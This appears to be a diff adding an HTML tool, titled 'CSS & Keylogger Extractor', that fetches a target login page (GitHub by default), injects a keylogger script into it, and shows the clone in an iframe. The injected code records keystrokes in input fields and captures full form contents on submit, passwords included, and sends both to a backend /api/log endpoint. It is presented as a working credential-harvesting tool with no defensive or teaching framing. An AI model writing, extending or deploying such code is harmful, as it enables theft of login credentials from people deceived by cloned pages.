@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSS & Keylogger Extractor</title>
+    <style>
+        body { font-family: sans-serif; margin: 0; padding: 20px; background: #f4f4f4; }
+        .container { display: flex; gap: 20px; height: calc(100vh - 40px); }
+        .control-panel { width: 300px; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: flex; flex-direction: column; }
+        .preview-area { flex: 1; background: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: flex; flex-direction: column; }
+        .iframe-container { flex: 1; border: none; width: 100%; }
+        .log-viewer { height: 150px; background: #222; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; overflow-y: auto; margin-top: 10px; border-radius: 4px; }
+        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { padding: 10px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #218838; }
+        h3 { margin-top: 0; }
+        .status { font-size: 12px; color: #666; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="control-panel">
+        <h3>Style & Keylogger Extractor</h3>
+        <label for="urlInput">Target URL:</label>
+        <input type="text" id="urlInput" placeholder="https://example.com/login" value="https://github.com/login">
+        
+        <button id="extractBtn">Extract & Inject</button>
+        <div class="status" id="statusMsg">Ready.</div>
+
+        <div class="log-viewer" id="logViewer">
+            <strong>Live Keystroke Log:</strong><br>
+            <div id="logContent">Waiting for input...</div>
+        </div>
+        
+        <div style="margin-top: 10px;">
+            <button id="clearLogs" style="background:#dc3545; width:100%;">Clear Logs</button>
+        </div>
+    </div>
+
+    <div class="preview-area">
+        <div style="padding: 10px; border-bottom: 1px solid #eee; font-size: 14px; font-weight: bold;">
+            Preview (Isolated Environment)
+        </div>
+        <div class="iframe-container" id="previewFrame"></div>
+    </div>
+</div>
+
+<script>
+    const urlInput = document.getElementById('urlInput');
+    const extractBtn = document.getElementById('extractBtn');
+    const previewFrame = document.getElementById('previewFrame');
+    const logContent = document.getElementById('logContent');
+    const statusMsg = document.getElementById('statusMsg');
+
+    // Injected Script Template
+    // This script will be injected into the target site's DOM
+    const keyloggerScript = `
+        (function() {
+            const targetUrl = window.location.href;
+            
+            function getSelector(el) {
+                if (el.id) return '#' + el.id;
+                if (el.name) return 'input[name="' + el.name + '"]';
+                return el.tagName.toLowerCase();
+            }
+
+            // Listen for keydown on the document
+            document.addEventListener('keydown', function(e) {
+                const activeElement = document.activeElement;
+                const selector = getSelector(activeElement);
+                
+                // Only log if typing in an input/textarea
+                if (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA') {
+                    const data = {
+                        url: targetUrl,
+                        keystroke: e.key,
+                        eventType: 'keydown',
+                        fieldSelector: selector
+                    };
+                    
+                    // Send to backend
+                    fetch('/api/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(console.error);
+                    
+                    // Update local UI if this script is running in the main frame (for dev preview)
+                    if (window.__isSpyPreview) {
+                        updateLocalLog(e.key, selector);
+                    }
+                }
+            });
+
+            // Intercept Form Submission
+            document.addEventListener('submit', function(e) {
+                const form = e.target;
+                const formData = new FormData(form);
+                const obj = {};
+                formData.forEach((value, key) => { obj[key] = value; });
+                
+                const data = {
+                    url: targetUrl,
+                    eventType: 'submit',
+                    fullFormState: obj
+                };
+
+                fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(console.error);
+                
+                if (window.__isSpyPreview) {
+                    updateLocalLog('SUBMIT', 'FORM: ' + JSON.stringify(obj));
+                }
+            });
+        })();
+        
+        // Helper for local UI update if running in preview
+        function updateLocalLog(key, field) {
+            const el = document.getElementById('logContent');
+            if (el) {
+                el.innerHTML += '<br>' + new Date().toLocaleTimeString() + ' | ' + field + ' | ' + key;
+                el.scrollTop = el.scrollHeight;
+            }
+        }
+    `;
+
+    async function extractAndInject() {
+        const url = urlInput.value.trim();
+        if (!url) return alert('Enter a URL');
+        
+        statusMsg.textContent = 'Fetching and parsing ' + url + '...';
+        
+        try {
+            // 1. Fetch the HTML from the backend
+            const response = await fetch('/api/extract/' + encodeURIComponent(url));
+            const data = await response.json();
+
+            if (!data.success) throw new Error(data.error);
+
+            // 2. Create an iframe with the source document
+            // We use srcdoc to inject the HTML directly, allowing us to control the context
+            const iframe = document.createElement('iframe');
+            iframe.style.width = '100%';
+            iframe.style.height = '100%';
+            iframe.style.border = 'none';
+            
+            // Flag to indicate this is our spy preview
+            // We need to append our script to the HTML before setting srcdoc
+            let modifiedHtml = data.html;
+            
+            // Inject the keylogger script before </body> or at the end
+            if (modifiedHtml.includes('</body>')) {
+                modifiedHtml = modifiedHtml.replace('</body>', '<script>window.__isSpyPreview = true; ' + keyloggerScript + '</script></body>');
+            } else {
+                modifiedHtml += '<script>window.__isSpyPreview = true; ' + keyloggerScript + '</script>';
+            }
+
+            iframe.srcdoc = modifiedHtml;
+            
+            previewFrame.innerHTML = '';
+            previewFrame.appendChild(iframe);
+            
+            statusMsg.textContent = 'Injected. Type in the preview to see logs.';
+
+            // Optional: Poll backend for logs if we want to see logs from "real" external access
+            // For this demo, the logs are local to the iframe via the helper function above.
+            
+        } catch (err) {
+            statusMsg.textContent = 'Error: ' + err.message;
+        }
+    }
+
+    extractBtn.addEventListener('click', extractAndInject);
+    
+    document.getElementById('clearLogs').addEventListener('click', () => {
+        logContent.innerHTML = 'Logs cleared.';
+    });
+
+    // Initialize with default
+    extractAndInject();
+</script>
+
+</body>
+</html>
